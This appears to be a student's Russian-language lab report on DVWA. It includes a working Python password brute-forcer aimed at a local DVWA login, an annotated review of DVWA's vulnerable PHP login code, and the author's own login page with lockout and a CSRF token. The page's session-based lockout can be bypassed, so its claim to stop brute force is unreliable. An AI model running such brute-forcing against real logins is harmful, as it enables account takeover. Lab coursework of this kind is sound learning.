# DAMDINOV_LAB_3

Для выполнения данной лабораторной работы была установлена виртуальная система Dojo
![image](https://github.com/user-attachments/assets/badda7dd-b919-49ab-9aa8-aebd15eaa26d)


Задание 1. Переборщик

Запуск DVWA 
![image](https://github.com/user-attachments/assets/44db3c1e-8834-4947-8cfa-72ce0c2d50b5)

Для успешного перебора кода нужно PHPSESSID 
![image](https://github.com/user-attachments/assets/c90a1eae-a58a-4ec1-88fe-4567a7284332)

Код переборщика:
```
import itertools
import requests
import time

charset = 'abcdefghijklmnopqrstuvwxyz'
pass_length = 8
username = "admin"
dop = "passwo"
session = requests.Session()
url = "http://localhost/dvwa/vulnerabilities/brute/"
session.cookies.set("PHPSESSID", "tpqr8qp76rlhvmp091uglh98tm")
session.cookies.set("security", "low")

def podbor(url, username, password):
    params = {
        'username': username,
        'password': password,
        'Login': 'Login'
    }
    try:
        response = session.get(url, params=params)
        return "Welcome to the password protected area admin" in response.text
    except requests.exceptions.ConnectionError as e:
        print(f"[-] Ошибка подключения: {e}")
        return False
    except requests.exceptions.RequestException as e:
        print(f"[-] Ошибка при запросе: {e}")
        return False

def generate_passwords(dop, length, charset):
    remaining_length = length - len(dop)
    for combination in itertools.product(charset, repeat=remaining_length):
        yield dop + ''.join(combination)

def main():
    start_time = time.time()
    print("[*] Начинаем перебор пароля...")
    for password in generate_passwords(dop, pass_length, charset):
        print(f"[*] Проверяем: {password}")
        if podbor(url, username, password):
            print(f"[+] Успешно! Пароль: {password}")
            break
    else:
        print("[-] Не удалось найти пароль.")
    end_time = time.time()
    print(f"[+] Время выполнения: {end_time - start_time:.2f} с")

if __name__ == "__main__":
    main()

```
Переборщик успешно подбирает пароль
![image](https://github.com/user-attachments/assets/24b006af-4ee7-4748-a1af-98a219350616)


Задание 2. Анализ кода
```
<?php
if( isset( $_GET[ 'Login' ] ) ) {
    // Получение имени пользователя
    $user = $_GET[ 'username' ];
    // Получение пароля
    $pass = $_GET[ 'password' ];
    
    // CWE-327 (Использование устаревшего или ненадежного криптографического алгоритма)
    // Используется MD5 для хеширования паролей, что небезопасно. Этот алгоритм считается устаревшим и уязвимым для атак, таких как подбор и коллизии.
    $pass = md5( $pass );

    // CWE-89 (SQL-инъекции)
    // Переменные $user и $pass напрямую вставляются в SQL-запрос без экранирования или использования подготовленных выражений. Это делает приложение уязвимым для SQL-инъекций.
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    
    // Выполнение SQL-запроса
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) 
        // CWE-209 (Утечка информации через сообщения об ошибках)
        // Вывод ошибок базы данных на экран позволяет атакующему получить информацию о структуре базы и настройках приложения, что облегчает последующие атаки.
        or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    if( $result && mysqli_num_rows( $result ) == 1 ) {
        // Получение данных пользователя
        $row    = mysqli_fetch_assoc( $result );
        $avatar = $row["avatar"];
        
        // CWE-79 (Неэкранированные данные во время генерации веб-страницы — XSS)
        // Данные, полученные из базы данных (например, $avatar), не проходят проверку или экранирование.
        // Это позволяет злоумышленнику внедрять вредоносный код (JavaScript) в веб-страницу.
        $html .= "<p>Welcome to the password protected area {$user}</p>";
        $html .= "<img src=\"{$avatar}\" />";
    }
    else {
        // Ошибка входа
        $html .= "<pre><br />Username and/or password incorrect.</pre>";
    }
    // Закрытие подключения
    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}
?>
```
1) Использование устаревшего хеширования (CWE-327): MD5 не обеспечивает должной безопасности для хранения паролей. Нужно заменить на bcrypt.

2) SQL-инъекции (CWE-89): прямое включение пользовательских данных в SQL-запросы без экранирования делает систему уязвимой. Необходимо использовать подготовленные выражения (mysqli_stmt или PDO).

3) Вывод ошибок базы данных в браузер (CWE-209): сообщения об ошибках предоставляют атакующему ценную информацию о сервере и базе данных. Ошибки должны логироваться только на сервере.

4) Уязвимость для XSS (CWE-79): Переменные $user и $avatar выводятся на страницу без экранирования. Это открывает возможность внедрения вредоносного кода. Нужно использовать htmlspecialchars для безопасного вывода данных.

5) Нет защиты от атак методом перебора: не предусмотрено ограничение на количество попыток входа, что делает систему уязвимой для атак перебора паролей.


Задание 3. Своя система авторизации
Для создания своей системы авторизации была установлена XAMPP
![image](https://github.com/user-attachments/assets/1286ac8f-dda0-411c-abb0-dff1c5d5b14c)

![image](https://github.com/user-attachments/assets/3b850774-2e7e-464f-92e3-6e5828637e23)

![image](https://github.com/user-attachments/assets/c04ee0d2-86a5-4edb-9d6f-a370aa81b950)
```
<?php
session_start();

$valid_username = "admin";       
$valid_password = "password123"; 
$max_attempts = 3;                
$lockout_time = 5 * 60;           

if (!isset($_SESSION['user_token'])) {
    $_SESSION['user_token'] = bin2hex(random_bytes(32));
}

if (!isset($_SESSION['login_attempts'])) {
    $_SESSION['login_attempts'] = [];
}

$ip = $_SERVER['REMOTE_ADDR'];

function isBlocked($ip, $max_attempts, $lockout_time) {
    if (!isset($_SESSION['login_attempts'][$ip])) {
        return 0;
    }

    $attempts = $_SESSION['login_attempts'][$ip];
    $recent_attempts = array_filter($attempts, function ($time) use ($lockout_time) {
        return $time > time() - $lockout_time;
    });

    $_SESSION['login_attempts'][$ip] = $recent_attempts; 

    if (count($recent_attempts) >= $max_attempts) {
        $remaining_time = $lockout_time - (time() - end($recent_attempts));
        return $remaining_time > 0 ? $remaining_time : 0;
    }

    return 0;
}

function recordFailedAttempt($ip) {
    if (!isset($_SESSION['login_attempts'][$ip])) {
        $_SESSION['login_attempts'][$ip] = [];
    }

    $_SESSION['login_attempts'][$ip][] = time();
}

$blocked_time = isBlocked($ip, $max_attempts, $lockout_time);
if ($blocked_time > 0) {
    die("Ваш IP временно заблокирован. Попробуйте снова через {$blocked_time} секунд.");
}

if (isset($_GET['Login'])) {
    $username = $_GET['username'] ?? '';
    $password = $_GET['password'] ?? '';
    $user_token = $_GET['user_token'] ?? '';

    if ($user_token !== $_SESSION['user_token']) {
        die("Ошибка: недопустимый токен.");
    }

    if ($username === $valid_username && $password === $valid_password) {
        $_SESSION['authenticated'] = true;
        echo "Добро пожаловать, {$username}!";
    } else {
        recordFailedAttempt($ip);
        echo "Неверное имя пользователя или пароль.";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
</head>
<body>
    <form method="GET">
        <label>Имя пользователя:</label><br>
        <input type="text" name="username" required><br>
        <label>Пароль:</label><br>
        <input type="password" name="password" required><br>
        <input type="hidden" name="user_token" value="<?php echo $_SESSION['user_token']; ?>"><br>
        <button type="submit" name="Login">Войти</button>
    </form>
</body>
</html>
```
Переборщик не может взломать данный аутентификатор потому что:
1) После 3 неправильных попыток входа с одного IP-адреса, пользователь блокируется на 5 минут. Это делает брутфорс бесполезным.
2) CSRF-защита: каждый запрос требует уникального токена user_token, который сгенерирован для текущей сессии. Переборщик не сможет угадать правильный токен и передать его в запросе.
3) Пароль и токен передаются как параметры в URL. Для переборщика потребуется постоянно менять токен, а это невозможно без доступа к сессии.
